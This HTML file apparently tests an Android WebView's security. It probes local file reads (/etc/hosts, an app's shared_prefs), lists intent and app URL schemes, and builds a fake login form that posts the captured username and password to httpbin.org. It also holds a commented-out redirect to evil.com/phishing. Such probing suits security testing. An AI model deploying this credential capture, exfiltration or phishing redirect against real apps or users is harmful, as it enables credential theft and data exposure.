<!DOCTYPE html>
<html>
<body>
    <h1>Advanced WebView Tests</h1>
    <div id="results"></div>
    
    <script>
        const results = document.getElementById('results');
        
        // Test 1: Try to access local files
        function testFileAccess() {
            results.innerHTML += '<h3>Test 1: File Access</h3>';
            
            // Try file:// scheme
            fetch('file:///etc/hosts')
                .then(r => r.text())
                .then(t => results.innerHTML += '<p>✅ Can read /etc/hosts</p>')
                .catch(e => results.innerHTML += '<p>❌ Cannot read files: ' + e.message + '</p>');
                
            // Try to access app data (common path)
            fetch('file:///data/data/com.application.abc/shared_prefs/')
                .catch(e => results.innerHTML += '<p>App data access: ' + e.message + '</p>');
        }
        
        // Test 2: Test for intent schemes
        function testIntentSchemes() {
            results.innerHTML += '<h3>Test 2: Intent Schemes</h3>';
            
            const schemes = [
                'intent://',
                'market://',
                'sms://',
                'tel://',
                'mailto://',
                'whatsapp://',
                'fb://',
                'twitter://'
            ];
            
            schemes.forEach(scheme => {
                let link = document.createElement('a');
                link.href = scheme + 'test';
                link.innerHTML = 'Test ' + scheme;
                link.style.display = 'block';
                results.appendChild(link);
            });
        }
        
        // Test 3: Try to steal focus and capture input
        function testInputCapture() {
            results.innerHTML += '<h3>Test 3: Input Capture</h3>';
            
            // Create a fake login form
            const form = document.createElement('div');
            form.innerHTML = `
                <h4>Fake Login</h4>
                <input type="text" id="username" placeholder="Username" style="padding:10px; margin:5px;">
                <input type="password" id="password" placeholder="Password" style="padding:10px; margin:5px;">
                <button onclick="captureLogin()" style="padding:10px;">Login</button>
                <p id="captured"></p>
            `;
            results.appendChild(form);
        }
        
        function captureLogin() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            document.getElementById('captured').innerHTML = 
                `Captured: ${user} / ${pass}`;
            
            // Try to exfiltrate
            fetch('https://httpbin.org/post', {
                method: 'POST',
                body: JSON.stringify({user, pass}),
                headers: {'Content-Type': 'application/json'}
            }).catch(e => console.log('Exfil failed:', e));
        }
        
        // Test 4: Try to navigate to other malicious sites
        function testNavigation() {
            results.innerHTML += '<h3>Test 4: Navigation Control</h3>';
            
            // Try to redirect after delay
            setTimeout(() => {
                window.location.href = 'https://evil.com/phishing';
            }, 5000);
            
            results.innerHTML += '<p>Will redirect in 5 seconds...</p>';
        }
        
        // Run tests
        testFileAccess();
        setTimeout(testIntentSchemes, 1000);
        setTimeout(testInputCapture, 2000);
        // testNavigation(); // Uncomment if you want to test redirects
    </script>
</body>
</html>
